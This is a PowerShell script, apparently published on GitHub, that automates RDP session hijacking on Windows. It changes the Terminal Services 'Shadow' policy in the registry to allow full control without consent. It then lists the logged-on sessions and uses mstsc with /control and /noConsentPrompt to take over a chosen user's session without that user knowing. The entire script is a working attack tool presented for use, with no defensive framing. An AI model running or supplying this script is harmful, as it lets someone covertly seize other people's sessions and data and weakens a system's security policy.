# Start-RdpSessionTakeover.ps1
# Originally written by Pyrrh1c 2/22/2021

<#
    .Synopsis
        This script automates the process of enumerating existing RDP sessions and allows the user to then take over a selected session.
    .Description
        A short script to automate the process of RDP session hijacking. When run without any parameters it will enumerate all existing RDP sessions and prompt for a session to be taken over. This script requires local admin to run.
    .Parameter UserName
        If you already know the username of the session you want to take over you can specify it and skip enumeration.
    .Example
        Start-RdpSessionTakeover.ps1
        The default behavior. Enumerats all existing RDP sessions, lists them, prompts for which to take over, then takes over the chosen session.
    .Example
        Start-RdpSessionTakeover.ps1 -UserName jdoe
        Takes over the session for user jdoe without enumerating all sessions.
    .Link
        http://github.com/pyrrh1c/Start-RdpSessionTakeover
    .Link
        http://pyrrh1c.net
    .Notes
        This script is under active development, stay tuned.
#>

# Defining the parameters for the script to run.
Param(
    [CmdletBinding(DefaultParameterSetName='UserName')]
    [Parameter()]
    [String]
    $UserName
)

#Requires -RunAsAdministrator

Write-Host "Enabling RDP Shadowing" -ForegroundColor Yellow
$RegPath = $RegPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
$Name = "Shadow"
$Value = 2
New-ItemProperty -Path $RegPath -Name $Name -Value $value -PropertyTYpe DWORD -Force
Clear-Host

if ($UserName -eq "")
{
    Clear-Host 
    $Sessions = C:\Windows\System32\qwinsta.exe /server:$ComputerName |
    ForEach-Object {
        $_.Trim() -replace "\s+",","
    } |
    ConvertFrom-Csv | ?{($_.SESSIONNAME -notlike '*services*') -And ($_.SESSIONNAME -notlike '*rdp-tcp') -And ($_.USERNAME -notlike '1')}
    
    Write-Host "Current RDP Sessions" -ForegroundColor Yellow
    Write-Host "===================="
    $i=0
    $Sessions | ForEach-Object{Write-Host $i": " $_.USERNAME; $i++}
    Write-Host "===================="
    $selection = Read-Host "Enter the number of the session to hijack"
    Clear-Host

    Write-Host "Connecting to Session" ($Sessions[$selection]).USERNAME -ForegroundColor Yellow
    mstsc /v:localhost /shadow:($Sessions[$selection]).ID /control /noConsentPrompt
}
else
{
    $Sessions = C:\Windows\System32\qwinsta.exe /server:$ComputerName |
    ForEach-Object {
        $_.Trim() -replace "\s+",","
    } |
    ConvertFrom-Csv | ?{$_.USERNAME -like $UserName}
    Clear-Host
    Write-Host "Taking over session for" $UserName -ForegroundColor Yellow
    mstsc /v:localhost /shadow:($Sessions[0]).ID /control /noConsentPrompt
}